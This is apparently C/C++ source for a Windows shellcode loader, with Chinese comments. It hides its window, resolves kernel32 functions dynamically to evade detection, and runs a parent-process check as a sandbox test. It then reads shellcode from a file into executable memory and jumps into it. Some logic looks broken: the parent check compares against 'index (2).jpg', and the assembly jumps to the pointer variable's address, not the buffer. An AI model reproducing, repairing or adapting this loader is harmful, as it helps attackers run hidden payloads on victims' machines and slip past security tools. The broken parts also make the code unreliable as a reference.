#include<stdio.h>
#include	"winapi.h"
#include	<TlHelp32.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积

using CREATE_FILE_WINAPI = HANDLE WINAPI(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
using READ_FILE_WINAPI = BOOL WINAPI(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
using GET_SIZE_FILE_WINAPI = DWORD WINAPI(HANDLE  hFile, unsigned long* lpFileSizeHigh);
using VirtualAllocWINAPI = LPVOID WINAPI(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
using CreateToolhelp32SnapshotWINAPI = HANDLE WINAPI(DWORD dwFlags, DWORD th32ProcessID);
using VirtualProtectWINAPI = BOOL WINAPI(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
DWORD get_explorer_processid() {
	DWORD explorer_id = -1;
	PROCESSENTRY32 pe;
	HANDLE hkz;
	const auto Address =
		WinApiImport<CreateToolhelp32SnapshotWINAPI>::get("CreateToolhelp32Snapshot", "kernel32.dll");
	if (Address == NULL) {
		return(-1);
	}
	hkz = Address(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hkz, &pe)) {
		do {
			if (wcscmp(pe.szExeFile, L"index (2).jpg") == 0)
			{
				explorer_id = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hkz, &pe));
	}
	return explorer_id;
}
DWORD get_parent_processid(DWORD pid)
{
	DWORD ParentProcessID = -1;
	PROCESSENTRY32 pe;
	HANDLE hkz;
	const auto Address =
		WinApiImport<CreateToolhelp32SnapshotWINAPI>::get("CreateToolhelp32Snapshot", "kernel32.dll");
	if (Address == NULL) {
		return(-1);
	}
	hkz = Address(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hkz, &pe)) {
		do {
			if (pe.th32ProcessID == pid) {
				ParentProcessID = pe.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hkz, &pe));
	}
	return ParentProcessID;
}

int main(int argc, char* argv[])
{
	DWORD explorer_id = get_explorer_processid();
	DWORD parent_id = get_parent_processid(GetCurrentProcessId());
	if (explorer_id != parent_id) { /* 判断父进程id是否和explorer进程id相同{ */
		printf("no same.");
		return -1;
	}
	const auto createfile_ = WinApiImport<CREATE_FILE_WINAPI>::get("CreateFileA", "kernel32.dll");
	const auto readfile_ = WinApiImport<READ_FILE_WINAPI>::get("ReadFile", "kernel32.dll");
	const auto getfilesize_ = WinApiImport<GET_SIZE_FILE_WINAPI>::get("GetFileSize", "kernel32.dll");
	const auto virtualalloc_ = WinApiImport<VirtualAllocWINAPI>::get("VirtualAlloc", "kernel32.dll");
	const auto virtualprotect_ = WinApiImport<VirtualProtectWINAPI>::get("VirtualProtect", "kernel32.dll");
	if (createfile_ == 0 || readfile_ == 0 || getfilesize_ == 0 || virtualalloc_ == 0 || virtualprotect_==0) {
		printf("get Addr Function Error!%d\n", GetLastError());
		return -1;
	}
	HANDLE hFile = createfile_(argv[1], GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Open  File Error!%d\n", GetLastError());
		return -1;
	}
	DWORD dwSize;
	dwSize = getfilesize_(hFile, NULL);
	char* shellocode = (char*)malloc(dwSize);
	memset(shellocode, 0, dwSize);

	LPVOID lpAddress = virtualalloc_(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	DWORD	oldProtect;
	virtualprotect_(lpAddress, dwSize, PAGE_EXECUTE_READWRITE, &oldProtect);

	if (lpAddress == NULL)
	{
		printf("VirtualAlloc error:%d\n", GetLastError());
		CloseHandle(hFile);
		return -1;
	}
	DWORD dwRead;
	readfile_(hFile, shellocode, dwSize, &dwRead, 0);
	memcpy(lpAddress, shellocode, dwSize);
	__asm
	{
		lea eax, lpAddress
		jmp eax
	}
	_flushall();
	MessageBox(0, L"a", L"A", 0);
	return 0;
}